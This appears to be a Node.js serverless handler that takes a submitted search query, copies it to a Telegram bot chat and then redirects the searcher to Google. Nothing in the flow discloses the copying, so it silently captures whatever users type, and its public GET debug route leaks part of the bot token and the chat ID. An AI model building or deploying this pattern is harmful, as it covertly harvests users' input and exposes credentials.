'use strict';

const { URLSearchParams } = require('url');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegram(text) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 5000);
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text }),
      signal: controller.signal,
    });
  } finally {
    clearTimeout(timer);
  }
}

async function getQuery(req) {
  if (req.body !== undefined && req.body !== null) {
    if (typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
      return String(req.body.q || '').trim();
    }
    const raw = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : String(req.body);
    return (new URLSearchParams(raw).get('q') || '').trim();
  }
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString('utf8');
  return (new URLSearchParams(raw).get('q') || '').trim();
}

module.exports = async (req, res) => {
  // GET handler for quick browser-based debugging
  if (req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end([
      'BOT_TOKEN: ' + (BOT_TOKEN ? BOT_TOKEN.slice(0, 10) + '...' : 'MISSING'),
      'CHAT_ID:   ' + (CHAT_ID   || 'MISSING'),
    ].join('\n'));
    return;
  }

  let query = '';
  try {
    query = await getQuery(req);
  } catch (err) {
    console.error('getQuery error:', err.message);
  }

  if (query) {
    try {
      await sendTelegram(query);
    } catch (err) {
      console.error('Telegram error:', err.message);
    }
  }

  res.writeHead(302, { Location: 'https://www.google.com/search?' + new URLSearchParams({ q: query }) });
  res.end();
};
